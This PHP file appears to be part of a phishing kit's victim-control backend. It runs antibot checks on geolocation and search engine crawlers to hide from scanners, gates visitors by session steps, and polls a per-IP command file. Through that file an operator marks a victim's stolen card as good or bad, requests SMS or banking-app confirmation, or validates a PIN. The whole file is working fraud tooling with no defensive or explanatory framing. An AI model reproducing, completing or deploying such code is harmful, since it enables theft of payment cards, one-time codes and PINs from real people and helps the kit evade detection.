<?php
session_start();
require_once dirname(__DIR__) . '/antibot.php';
checkGeolocation();
checkSearchEngineBot();

// Antibot check logic
if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < 3) {
    exit();
}
if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    exit();
}

//   _____         _ __      __     
//  / ____|  /\   | |\ \    / /\    
// | (___   /  \  | | \ \  / /  \   
//  \___ \ / /\ \ | |  \ \/ / /\ \  
//  ____) / ____ \| |___\  / ____ \ 
// |_____/_/    \_\______\/_/    \_\

$userIP = trim($_SERVER['REMOTE_ADDR']);  
$ipListFile = './ip_list.txt';

if (file_exists($ipListFile)) {
    // Read file into an array (each line is an element)
    $lines = file($ipListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    if ($lines !== false) {
        // Iterate in reverse to find the LATEST command for this IP
        for ($i = count($lines) - 1; $i >= 0; $i--) {
            $line = $lines[$i];
            
            // Check if line contains user IP
            if (strpos($line, $userIP . ',') !== false) {

                // Check commands based on priority/existence in this specific line
                if (strpos($line, ',smswaiting') !== false) {
                    echo 'smswaiting';
                    break;
                } elseif (strpos($line, ',appwaiting') !== false) {
                    echo 'appwaiting';
                    break;
                } elseif (strpos($line, ',appwait') !== false) {
                    // Just wait (echo nothing or 'wait') - Reset status priority
                    break;
                } elseif (strpos($line, ',appvalid') !== false) {
                    echo 'appvalid';
                    break;
                } elseif (strpos($line, ',appbad') !== false) {
                    echo 'appbad';
                    break;
                } elseif (strpos($line, ',sstrue') !== false) {
                    echo 'sstrue';
                    break;
                } elseif (strpos($line, ',ssfalse') !== false) {
                    echo 'ssfalse';
                    break;
                } elseif (strpos($line, ',tovapp') !== false) {
                    echo 'tovapp';
                    break;
                } elseif (strpos($line, ',ssredi') !== false) {
                    echo 'ssredi';
                    break;
                } elseif (strpos($line, ',badcc') !== false) {
                    echo 'badcc';
                    break;
                } elseif (strpos($line, ',goodcc') !== false) {
                    echo 'goodcc';
                    break;
                } elseif (strpos($line, ',pincc') !== false) {
                    echo 'pincc';
                    break;
                } elseif (strpos($line, ',pinvalid') !== false) {
                    echo 'pinvalid';
                    break;
                } elseif (strpos($line, ',pinbad') !== false) {
                    echo 'pinbad';
                    break;
                }
            }
        }
    }
}
?>